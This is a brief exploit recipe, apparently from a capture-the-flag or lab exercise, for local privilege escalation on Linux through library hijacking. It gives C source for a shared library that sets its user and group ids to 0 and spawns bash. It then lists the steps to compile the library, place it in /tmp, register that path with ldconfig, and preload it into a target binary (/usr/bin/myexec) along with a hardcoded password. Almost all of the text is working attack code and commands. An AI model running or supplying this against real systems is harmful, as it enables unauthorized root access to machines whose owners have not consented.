libseclogin.c
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
void seclogin()
{
        setuid(0);
        setgid(0);
        execl("/bin/bash","sh",(char *)0);
}
int main(void)
{
        seclogin();
}
 
Compile the code with
gcc -shared -o libseclogin.so -fPIC libseclogin.c
 
cp libseclogin.so to /tmp
 
cd /etc/ld.so.conf.d
ldconfig test.conf
(test.conf write /tmp)
it will give this output
/sbin/ldconfig.real: relative path `test.conf' used to build cache
 
env LD_LIBRARY_PATH=/tmp LD_PRELOAD=/tmp/libseclogin.so strace echo 's3cur3l0g1n' | /usr/bin/myexec
